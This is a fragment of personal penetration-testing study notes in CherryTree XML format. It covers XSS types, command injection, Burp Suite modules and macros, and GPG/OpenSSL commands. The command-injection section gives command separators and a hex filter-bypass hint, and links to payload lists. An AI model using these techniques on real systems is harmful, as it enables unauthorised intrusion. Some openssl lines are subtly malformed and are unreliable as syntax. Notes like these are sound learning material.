        <rich_text indent="1">Blind XSS is similar to a stored XSS (which we covered in task 4) in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.</rich_text>
        <rich_text>
</rich_text>
        <rich_text indent="2">use the XSS Hunter Express tool </rich_text>
        <rich_text>
</rich_text>
        <rich_text indent="2">https://github.com/mandatoryprogrammer/xsshunter-express</rich_text>
        <rich_text>

Reflected (Client-side):
</rich_text>
        <rich_text indent="1">Reflected XSS is javascript that is run on the client-side end of the web application. These are most commonly found when the server doesn't sanitise search data.</rich_text>
        <rich_text>
</rich_text>
        <rich_text indent="2">query parameters
URL file path
HTTP headers</rich_text>
        <rich_text>
</rich_text>
      </node>
    </node>
    <node name="Command Injection" unique_id="102" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702483860" ts_lastsave="1702484549">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PHP vulnerable functions:
</rich_text>
      <rich_text indent="1">Exec
Passthru
System</rich_text>
      <rich_text>

Input Filtering: use hex

use ; &amp; &amp;&amp;</rich_text>
      <node name="Info" unique_id="103" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1702483860" ts_lastsave="1702895052">
        <rich_text>Types:
</rich_text>
        <rich_text indent="1">Blind
</rich_text>
        <rich_text indent="2">This type of injection is where there is no direct output from the application when testing payloads. You will have to investigate the behaviours of the application to determine whether or not your payload was successful.</rich_text>
        <rich_text>
</rich_text>
        <rich_text indent="1">Verbose</rich_text>
        <rich_text>
</rich_text>
        <rich_text indent="2">This type of injection is where there is direct feedback from the application once you have tested a payload. For example, running the whoami command to see what user the application is running under. The web application will output the username on the page directly.</rich_text>
        <rich_text>

useful commands:
</rich_text>
        <rich_text indent="1" link="webs https://github.com/payloadbox/command-injection-payload-list">https://github.com/payloadbox/command-injection-payload-list</rich_text>
      </node>
    </node>
  </node>
  <node name="Burp" unique_id="68" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697138374" ts_lastsave="1702910117">
    <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
    <rich_text>
Updating cookie &amp; token with Macro:
</rich_text>
    <rich_text indent="1">Capture the request to the general page
</rich_text>
    <rich_text indent="2">Identify the cookie-name and CSRF-token-parameter name</rich_text>
    <rich_text indent="1">
Go to main settings -&gt; sessions
</rich_text>
    <rich_text indent="2">Go to Macro's and click Add</rich_text>
    <rich_text indent="1">
</rich_text>
    <rich_text indent="3">Select the correct GET request</rich_text>
    <rich_text indent="1">
</rich_text>
    <rich_text indent="2">Go to Session Handling Rules and click Add</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="3">Open the Scope tab and select the tool and only ise suite scope</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="3">In the Details tab Add a Rule Action</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="4">Select Run a Macro</rich_text>
    <rich_text> and select the created Macro
</rich_text>
    <rich_text indent="4">Select "Update only the following parameters and headers", then click the Edit.
</rich_text>
    <rich_text indent="5">In the "Enter a new item" text field, type "</rich_text>
    <rich_text indent="5" weight="heavy">CSRF-token-parameter-name</rich_text>
    <rich_text indent="5">". Press Add, then Close.</rich_text>
    <rich_text indent="4">
Select "Update only the following cookies", then click the relevant Edit button.
</rich_text>
    <rich_text indent="5">Enter "</rich_text>
    <rich_text indent="5" weight="heavy">cookie-name</rich_text>
    <rich_text indent="5">" in the "Enter a new item" text field. Press Add, then Close.</rich_text>
    <rich_text>


Shortcuts:
</rich_text>
    <rich_text indent="1">Ctrl + Shift + D -&gt; Switch to the Dashboard
Ctrl + Shift + T -&gt; Switch to the Target tab
Ctrl + Shift + P -&gt; Switch to the Proxy tab
Ctrl + Shift + I -&gt; Switch to the Intruder tab
Ctrl + Shift + R -&gt; Switch to the Repeater tab</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">Ctrl + U -&gt;</rich_text>
    <rich_text>URL encode selected text
</rich_text>
    <node name="Modules" unique_id="70" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697141883" ts_lastsave="1702910338">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Modules:
</rich_text>
      <rich_text indent="1" weight="heavy">Proxy</rich_text>
      <rich_text indent="1">: Intercept and modify requests/responses when interacting with web applications.
</rich_text>
      <rich_text indent="1" weight="heavy">Repeater</rich_text>
      <rich_text indent="1">: Capture, modify, then resend the same request numerous times. 
</rich_text>
      <rich_text indent="1" weight="heavy">Intruder</rich_text>
      <rich_text indent="1">: Spray an endpoint with requests for bruteforce attacks or to fuzz endpoints.
</rich_text>
      <rich_text indent="1" weight="heavy">Decoder</rich_text>
      <rich_text indent="1">: Decoding captured information, or encoding a payload prior to sending it to the target.
</rich_text>
      <rich_text indent="1" weight="heavy">Comparer</rich_text>
      <rich_text indent="1">: Compare two pieces of data at either word or byte level.
</rich_text>
      <rich_text indent="1" weight="heavy">Sequencer</rich_text>
      <rich_text indent="1">: Assess the randomness of tokens such as session cookie values or other supposedly random generated data. </rich_text>
      <rich_text>

INTRUDER:
</rich_text>
      <rich_text indent="1">Sniper Attack:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">The Sniper attack type is the default and most commonly used attack type in Burp Suite Intruder. It is particularly effective for single-position attacks, such as password brute-force or fuzzing for API endpoints. In a Sniper attack, we provide a set of payloads, which can be a wordlist or a range of numbers, and Intruder inserts each payload into each defined position in the request.</rich_text>
      <rich_text>

</rich_text>
      <rich_text indent="1">Battering Ram Attack:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">The Battering ram attack type in Burp Suite Intruder differs from Sniper in that it places the same payload in every position simultaneously, rather than substituting each payload into each position in turn.</rich_text>
      <rich_text>

</rich_text>
      <rich_text indent="1">Pitchfork Attack:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">The Pitchfork attack type in Burp Suite Intruder is similar to having multiple Sniper attacks running simultaneously. While Sniper uses one payload set to test all positions simultaneously, Pitchfork utilises one payload set per position (up to a maximum of 20) and iterates through them all simultaneously.</rich_text>
      <rich_text>

</rich_text>
      <rich_text indent="1">Cluster Bomb Attack:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">The Cluster bomb attack type in Burp Suite Intruder allows us to choose multiple payload sets, one per position (up to a maximum of 20). Unlike Pitchfork, where all payload sets are tested simultaneously, Cluster bomb iterates through each payload set individually, ensuring that every possible combination of payloads is tested.</rich_text>
      <rich_text>

DECODER:
</rich_text>
      <rich_text indent="1">Plain: This refers to the raw text before any transformations are applied.

URL: Is utilized to ensure the safe transfer of data in the URL of a web request. It involves substituting characters for their ASCII character code in hexadecimal format, preceded by a percentage symbol (%). This method is vital for any type of web application testing.

HTML: Replaces special characters with an ampersand (&amp;), followed by either a hexadecimal number or a reference to the character being escaped, and ending with a semicolon (;). This method ensures the safe rendering of special characters in HTML and helps prevent attacks such as XSS. The HTML option in Decoder allows any character to be encoded into its HTML escaped format or decode captured HTML entities.

Base64: A commonly used encoding method, converts any data into an ASCII-compatible format. The under-the-hood functioning isn't crucial at this stage; however, interested individuals can find the underlying mathematics here.

ASCII Hex: This option transitions data between ASCII and hexadecimal representations. For instance, the word "ASCII" can be converted into the hexadecimal number "4153434949". Each character is converted from its numeric ASCII representation into hexadecimal.

Hex, Octal, and Binary: These encoding methods apply solely to numeric inputs, converting between decimal, hexadecimal, octal (base eight), and binary representations.

Gzip: Compresses data, reducing file and page sizes before browser transmission. Faster load times are highly desirable for developers looking to enhance their SEO score and avoid user inconvenience. Decoder facilitates the manual encoding and decoding of gzip data, although it often isn't valid ASCII/Unicode.</rich_text>
      <rich_text>

</rich_text>
      <rich_text indent="1">Hashing -&gt; encode ASCII HEX</rich_text>
      <rich_text> for text</rich_text>
    </node>
  </node>
  <node name="Cryptography" unique_id="87" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699366282" ts_lastsave="1711027644">
    <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
    <rich_text>
Useful tools:
</rich_text>
    <rich_text indent="1" link="webs https://github.com/Ganapati/RsaCtfTool">https://github.com/Ganapati/RsaCtfTool</rich_text>
    <rich_text indent="1">
</rich_text>
    <rich_text indent="1" link="webs https://github.com/ius/rsatool">https://github.com/ius/rsatool</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1" link="webs https://www.quipqiup.com/">https://www.quipqiup.com/</rich_text>
    <rich_text>

GPG:
</rich_text>
    <rich_text indent="1">List ciphers</rich_text>
    <rich_text>:
</rich_text>
    <rich_text indent="2">gpg --version</rich_text>
    <rich_text>

</rich_text>
    <rich_text indent="1">Encrypt</rich_text>
    <rich_text>:
</rich_text>
    <rich_text indent="2">gpg --symmetric --cipher-algo </rich_text>
    <rich_text indent="2" weight="heavy">CIPHER</rich_text>
    <rich_text indent="2"> </rich_text>
    <rich_text weight="heavy">PLAINTEXT</rich_text>
    <rich_text>

</rich_text>
    <rich_text indent="1">Decrypt</rich_text>
    <rich_text>:
</rich_text>
    <rich_text indent="2">gpg --output </rich_text>
    <rich_text indent="2" weight="heavy">PLAINTEXT</rich_text>
    <rich_text indent="2"> --decrypt </rich_text>
    <rich_text weight="heavy">CIPHER_TEXT</rich_text>
    <rich_text>

</rich_text>
    <rich_text indent="2">gpg --import</rich_text>
    <rich_text indent="2" weight="heavy"> GPG_KEY_FILE</rich_text>
    <rich_text indent="2">
gpg </rich_text>
    <rich_text indent="2" weight="heavy">ENCRYPTED_FILE</rich_text>
    <rich_text indent="2">
New file will be created with the plaintext</rich_text>
    <rich_text>

OpenSSL:
</rich_text>
    <rich_text indent="1">AES:</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">Encrypt:
</rich_text>
    <rich_text indent="3">openssl aes-256-cbc -e -in </rich_text>
    <rich_text indent="3" weight="heavy">PLAINTEXT</rich_text>
    <rich_text indent="3"> -out </rich_text>
    <rich_text indent="3" weight="heavy">CIPHER_TEXT</rich_text>
    <rich_text indent="2">
Decrypt:
</rich_text>
    <rich_text indent="3">openssl aes-256-cbc -d -in </rich_text>
    <rich_text indent="3" weight="heavy">CIPHER_TEXT</rich_text>
    <rich_text indent="3"> -out </rich_text>
    <rich_text indent="3" weight="heavy">PLAINTEXT</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">RSA:</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">Private Key generate:
</rich_text>
    <rich_text indent="3">openssl genrsa -out </rich_text>
    <rich_text indent="3" weight="heavy">PRIVATE_KEY</rich_text>
    <rich_text indent="3">.pem </rich_text>
    <rich_text indent="3" weight="heavy">KEY_SIZE</rich_text>
    <rich_text indent="2">
Public Key generate:
</rich_text>
    <rich_text indent="3">openssl rsa -in </rich_text>
    <rich_text indent="3" weight="heavy">PRIVATE_KEY</rich_text>
    <rich_text indent="3">.pem -pubout -out </rich_text>
    <rich_text indent="3" weight="heavy">PUBLIC_KEY</rich_text>
    <rich_text indent="3">.pem</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">Analyze private key:</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="3">openssl rsa -in </rich_text>
    <rich_text indent="3" weight="heavy">PRIVATE_KEY</rich_text>
    <rich_text indent="3">.pem -text -noout</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">Encrypt:
</rich_text>
    <rich_text indent="3">openssl pkeyutl -encrypt -in </rich_text>
    <rich_text indent="3" weight="heavy">PLAINTEXT</rich_text>
    <rich_text indent="3"> -out </rich_text>
    <rich_text indent="3" weight="heavy">CIPHER_TEXT</rich_text>
    <rich_text indent="3"> -inkey </rich_text>
    <rich_text indent="3" weight="heavy">PUBLIC_KEY</rich_text>
    <rich_text indent="3">.pem -pubin</rich_text>
    <rich_text indent="2">
Decrypt:
</rich_text>
    <rich_text indent="3">o</rich_text>
    <rich_text>penssl pkeyutl -decrypt -in </rich_text>
    <rich_text weight="heavy">CIPHER_TEXT</rich_text>
    <rich_text> -inkey </rich_text>
    <rich_text weight="heavy">PRIVATE_KEY</rich_text>
    <rich_text>.pem -out </rich_text>
    <rich_text weight="heavy">PLAINTEXT</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">DH:</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">Analyze</rich_text>
    <rich_text> parameters:
</rich_text>
    <rich_text indent="3">openssl dhparam -in </rich_text>
    <rich_text indent="3" weight="heavy">dhparams</rich_text>
    <rich_text indent="3">.pem -text -noout</rich_text>
    <rich_text>

Hashing:
</rich_text>
    <rich_text indent="1">sha256sum </rich_text>
    <rich_text indent="1" weight="heavy">FILE</rich_text>
    <rich_text>

Certificates:
</rich_text>
    <rich_text indent="1">Generate certificate signing request</rich_text>
    <rich_text>:
</rich_text>
    <rich_text indent="2">openssl req -new -nodes -newkey rsa:4096 -keyout </rich_text>
    <rich_text indent="2" weight="heavy">KEY</rich_text>
    <rich_text indent="2">.pem -out </rich_text>
    <rich_text indent="2" weight="heavy">CERT</rich_text>
    <rich_text indent="2">.csr</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">Generate self-signed certificate</rich_text>
    <rich_text>:
</rich_text>
    <rich_text indent="2">o</rich_text>
    <rich_text>penssl req -x509 -newkey -nodes rsa:4096 -keyout </rich_text>
    <rich_text weight="heavy">KEY</rich_text>
    <rich_text>.pem -out </rich_text>
    <rich_text weight="heavy">CERT</rich_text>
    <rich_text>.pem -sha256 -days </rich_text>
    <rich_text weight="heavy">365</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">View certificate:</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">openssl x509 -in cert.pem -text</rich_text>
    <rich_text>
</rich_text>
  </node>
  <node name="Notes" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1696093389" ts_lastsave="1702904056">
    <rich_text>
=================







</rich_text>
  </node>
</cherrytree>
